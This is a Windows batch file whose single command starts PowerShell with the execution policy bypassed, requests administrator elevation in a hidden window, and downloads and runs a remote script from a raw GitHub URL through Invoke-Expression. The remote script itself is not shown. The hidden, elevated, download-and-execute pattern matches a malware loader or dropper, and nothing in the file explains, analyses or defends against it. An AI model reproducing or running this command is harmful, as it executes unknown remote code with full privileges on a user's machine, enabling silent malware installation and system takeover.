@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -Verb RunAs -WindowStyle Hidden powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/cctv-security/AQ/refs/heads/main/AQ.ps1'' -UseBasicParsing).Content\"'"
